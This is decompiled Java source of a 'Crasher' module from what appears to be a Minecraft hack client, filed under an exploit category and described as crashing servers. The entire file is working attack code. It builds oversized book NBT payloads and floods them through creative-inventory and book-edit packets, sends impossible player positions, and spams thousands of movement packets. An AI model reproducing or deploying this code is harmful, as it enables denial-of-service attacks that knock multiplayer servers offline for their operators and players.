// 
// Decompiled by Procyon v0.5.36
// 

package vip.Resolute.modules.impl.exploit;

import net.minecraft.network.play.client.C17PacketCustomPayload;
import java.util.Random;
import net.minecraft.network.PacketBuffer;
import io.netty.buffer.Unpooled;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;
import vip.Resolute.events.impl.EventUpdate;
import vip.Resolute.events.Event;
import vip.Resolute.settings.Setting;
import vip.Resolute.util.misc.TimerUtil;
import vip.Resolute.settings.impl.NumberSetting;
import vip.Resolute.settings.impl.ModeSetting;
import vip.Resolute.modules.Module;

public class Crasher extends Module
{
    public ModeSetting mode;
    public NumberSetting interval;
    public NumberSetting posDelay;
    TimerUtil timerUtil;
    
    public Crasher() {
        super("Crasher", 0, "Crashes some servers", Category.EXPLOIT);
        this.mode = new ModeSetting("Mode", "Book", new String[] { "Book", "Item", "Position", "Fly", "AAC5" });
        this.interval = new NumberSetting("Interval", 1.0, this::isModeSelected, 1.0, 10.0, 1.0);
        this.posDelay = new NumberSetting("Position Delay", 150.0, this::isMode2Selected, 5.0, 2000.0, 5.0);
        this.timerUtil = new TimerUtil();
        this.addSettings(this.mode, this.interval, this.posDelay);
    }
    
    public boolean isModeSelected() {
        return this.mode.is("Book");
    }
    
    public boolean isMode2Selected() {
        return this.mode.is("Position");
    }
    
    @Override
    public void onEvent(final Event e) {
        if (e instanceof EventUpdate) {
            if (this.mode.is("Item")) {
                final ItemStack book = new ItemStack(Items.writable_book);
                final NBTTagList list = new NBTTagList();
                final NBTTagCompound tag = new NBTTagCompound();
                final String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                for (int i = 0; i < 50; ++i) {
                    final String siteContent = size;
                    final NBTTagString tString = new NBTTagString(siteContent);
                    list.appendTag(tString);
                }
                tag.setString("author", "peepee");
                tag.setString("title", "poopoo");
                tag.setTag("pages", list);
                book.setTagInfo("pages", list);
                book.setTagCompound(tag);
                for (int i = 0; i < 100; ++i) {
                    try {
                        Crasher.mc.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(0, book));
                    }
                    catch (Exception eex) {
                        eex.printStackTrace();
                    }
                }
            }
            if (this.mode.is("AAC5")) {
                Crasher.mc.getNetHandler().sendPacketNoEvent(new C03PacketPlayer.C04PacketPlayerPosition(1.7E301, -999.0, 0.0, true));
            }
            if (this.mode.is("Fly")) {
                final double playerX = Crasher.mc.thePlayer.posX;
                final double playerY = Crasher.mc.thePlayer.posY;
                final double playerZ = Crasher.mc.thePlayer.posZ;
                double y = 0.0;
                final double x = 0.0;
                double z = 0.0;
                for (int j = 0; j < 200; ++j) {
                    y = j * 9;
                    Crasher.mc.thePlayer.sendQueue.sendPacketNoEvent(new C03PacketPlayer.C04PacketPlayerPosition(playerX, playerY + y, playerZ, false));
                }
                for (int j = 0; j < 10000; ++j) {
                    z = j * 9;
                    Crasher.mc.thePlayer.sendQueue.sendPacketNoEvent(new C03PacketPlayer.C04PacketPlayerPosition(playerX, playerY + y, playerZ + z, false));
                }
            }
            if (this.mode.is("Book") && Minecraft.getDebugFPS() >= 5) {
                final ItemStack bookStack = new ItemStack(Items.writable_book);
                final NBTTagCompound bookCompound = new NBTTagCompound();
                bookCompound.setString("author", randomNumber(20));
                bookCompound.setString("title", randomNumber(20));
                final NBTTagList pageList = new NBTTagList();
                final String pageText = randomNumber(600);
                for (int k = 0; k < 49; ++k) {
                    pageList.appendTag(new NBTTagString(pageText));
                }
                bookCompound.setTag("pages", pageList);
                bookStack.setTagCompound(bookCompound);
                for (int k = 0; k < 99.0 * this.interval.getValue(); ++k) {
                    final PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
                    packetBuffer.writeItemStackToBuffer(bookStack);
                    Crasher.mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload(new Random().nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer));
                }
                return;
            }
            if (this.mode.is("Position") && this.timerUtil.hasElapsed((long)this.posDelay.getValue())) {
                Crasher.mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Crasher.mc.thePlayer.posX + this.randDouble(500.0, 1000.0), Crasher.mc.thePlayer.posX + this.randDouble(500.0, 1000.0), Crasher.mc.thePlayer.posZ + this.randDouble(500.0, 1000.0), Crasher.mc.thePlayer.onGround));
            }
        }
    }
    
    public double randDouble(final double bound1, final double bound2) {
        final double min = Math.min(bound1, bound2);
        final double max = Math.max(bound1, bound2);
        return min + Math.random() * (max - min);
    }
    
    public static String randomNumber(final int length) {
        return random(length, "123456789");
    }
    
    public static String random(final int length, final String chars) {
        return random(length, chars.toCharArray());
    }
    
    public static String random(final int length, final char[] chars) {
        final StringBuilder stringBuilder = new StringBuilder();
        for (int i = 0; i < length; ++i) {
            stringBuilder.append(chars[new Random().nextInt(chars.length)]);
        }
        return stringBuilder.toString();
    }
}
